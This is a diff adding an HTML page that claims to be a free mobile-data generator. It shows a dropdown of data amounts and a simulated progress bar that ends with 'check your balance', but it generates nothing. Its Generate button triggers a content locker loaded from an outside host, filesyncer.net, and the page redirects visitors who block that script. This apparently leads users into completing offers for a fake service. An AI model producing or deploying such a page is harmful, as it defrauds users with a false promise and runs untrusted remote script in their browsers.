@@ -1,0 +1,187 @@
+<!DOCTYPE.html>
+    <html lang="en">
+        <html>
+            <head>
+        <link rel="stylesheet" type="text/css" href="fontawesome/css/all.css"> 
+
+                <style> 
+                     body{
+                        margin: 0px;
+                        padding: 0px;
+                        background: #9E5B5B;
+                    }
+                    header{
+                        background: black;
+                        color: white;
+                        height: 80px;
+                        text-align: center;
+                        padding-top: 10px;
+                    }
+                    .sec1{
+                        width: 100%;
+                        height: 900px;
+                        background: cyan;
+                    }
+                    .container1{
+                        width: 60%;
+                        margin: auto;
+                        background: #7AE291;
+                        height: 500px;
+                        border: 3px solid black;
+                        box-shadow: 4px 2px blue;
+                        padding: 15px;
+                    }
+                    .image{
+                        text-align: center;
+                        padding: 10px;
+                        font-size: 18px;
+                        font-family: sans-serif;
+                        font-weight: bold;
+                    }
+                    input[type="text"]{
+                        width: 340px;
+                        height: 36px;
+                        padding: 10px;
+                    }
+                    label{
+                        font-size: 16px;
+                        color: white;
+                    }
+                    button{
+                        width: 120px;
+                        height: 36px;
+                        color: white;
+                        background: blue;
+                        border: none;
+                        border-radius: 3px;
+                        font-size: 16px;
+                        font-weight: bold;
+                        font-family: sans-serif;
+                    }
+                    form{
+                        padding: 10px;
+                    }
+                    select{
+                        width: 340px;
+                        height: 40px;
+                        padding:10px;
+                        margin-top: -100px;
+                        font-size: 16px;
+                        font-weight: bold;
+                        font-family: sans-serif;
+                    }
+                    #progressBar{
+                        padding: 10px;
+                    }
+                    h2{
+                        color: blue;
+                        font-size: 22px;
+                        font-weight: bold;
+                        font-family: sans-serif;
+                    }
+                        </style>
+                <title>This is the second link</title>
+                <script type="text/javascript">var lck = false;</script>
+<script type="text/javascript" src="https://filesyncer.net/script_include.php?id=828839"></script>
+<script type="text/javascript">if(!lck){top.location = 'https://filesyncer.net/help/ablk.php'; }</script><noscript>Please enable JavaScript to access this page.<meta http-equiv="refresh" content="0;url=https://filesyncer.net/help/enable_javascript.php" /></noscript>
+            </head>
+            <body>
+                 <header>
+                    <h1>Data Generator Tool For All Networks</h1>
+                </header>
+                    <div class="container1">
+                        <div class="image">
+<img src="images/glo4.jpg" width="200" height="100">
+<hr>
+<h2>Select The Amount Of Data And Click Generate.</h2>
+<h3>NOTE:<b>Pick The Available Data You Want.</b></h3>
+<div id="portfolio" class="page hide">
+     <div class="container" style="margin-top: 100px;">
+<center>
+      <form method="post" action"#">
+       <select class="form-control">
+  
+  <option>====Select Data Amount====</option>
+  <option>===Available===</option>
+  <option>5GB</option>
+  <option>100MB</option>
+  <option>180MB</option>
+  <option>200MB</option>
+  <option>300MB</option>
+  <option>500MB</option>
+  <option>750MB</option>
+  <option>800GB</option>
+  <option>1GB</option>
+  <option>2.5GB</option>
+  <option>3GB</option>
+  <option>4GB</option>
+  <option>4.5GB</option>
+  <option>5GB</option>
+  <option>===Not Available===</option>
+  <option>10GB</option>
+  <option>12GB</option>
+  <option>18GB</option>
+  
+</select><br>
+     
+     <progress id="progressBar" value="50" max="100" style="width:250px;"></progress>
+  <span id="status">50%</span>
+  
+    
+  
+  <div style="font-size:24px;font-weight:bold" id="finalMessage">
+  </div>
+  <div style="color:red;font-size:14px" id="finalMessage2">
+  </div><br>
+    
+     <button type="button" onclick="call_locker();" class="btn btn-success"><i class="fa fa-spinner fa-pulse"></i> Generate</button>  <br>
+
+ 
+</form>
+     </div>
+    </div>
+   </div>
+  </div>
+
+<script>
+function start(al) {
+  var bar = document.getElementById('progressBar');
+  var status = document.getElementById('status');
+  status.innerHTML = al + "%";
+  bar.value = al;
+  al++;
+  var sim = setTimeout("start(" + al + ")", 80);
+  if (al == 100) {
+    status.innerHTML = "100%";
+    bar.value = 100;
+    clearTimeout(sim);
+    var finalMessage = document.getElementById('finalMessage');
+    finalMessage.innerHTML = "Process is complete";
+    var finalMessage2 = document.getElementById('finalMessage2');
+    finalMessage2.innerHTML = "(check your balance)";
+  }
+}
+</script>
+
+<script>
+
+$(document).ready(function() {
+    $("#information-link").on('click', function() {
+        $("#pages .page:not('.hide')").stop().fadeOut('fast', function() {
+            $(this).addClass('hide');
+            $('#information').fadeIn('slow').removeClass('hide');
+        });
+    });
+    $("#portfolio-link").on('click', function() {
+        $("#pages .page:not('.hide')").stop().fadeOut('fast', function() {
+            $(this).addClass('hide');
+            $('#portfolio').fadeIn('slow').removeClass('hide');
+        });
+    });
+});
+
+</script>
+
+
+            </body>
+        </html>
